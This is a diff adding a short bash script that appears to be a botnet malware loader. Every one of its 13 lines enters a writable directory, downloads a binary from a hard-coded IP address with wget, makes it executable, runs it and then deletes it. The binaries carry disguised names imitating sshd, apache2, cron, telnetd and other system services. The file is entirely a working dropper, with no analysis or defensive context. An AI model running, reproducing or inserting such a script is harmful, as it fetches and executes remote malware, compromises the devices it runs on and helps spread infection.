@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglantpd; chmod +x ganglantpd; ./ganglantpd; rm -rf ganglantpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglasshd; chmod +x ganglasshd; ./ganglasshd; rm -rf ganglasshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglaopenssh; chmod +x ganglaopenssh; ./ganglaopenssh; rm -rf ganglaopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglabash; chmod +x ganglabash; ./ganglabash; rm -rf ganglabash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglatftp; chmod +x ganglatftp; ./ganglatftp; rm -rf ganglatftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglawget; chmod +x ganglawget; ./ganglawget; rm -rf ganglawget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglacron; chmod +x ganglacron; ./ganglacron; rm -rf ganglacron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglaftp; chmod +x ganglaftp; ./ganglaftp; rm -rf ganglaftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglapftp; chmod +x ganglapftp; ./ganglapftp; rm -rf ganglapftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglash; chmod +x ganglash; ./ganglash; rm -rf ganglash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglashit; chmod +x ganglashit; ./ganglashit; rm -rf ganglashit
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglaapache2; chmod +x ganglaapache2; ./ganglaapache2; rm -rf ganglaapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.216/ganglatelnetd; chmod +x ganglatelnetd; ./ganglatelnetd; rm -rf ganglatelnetd
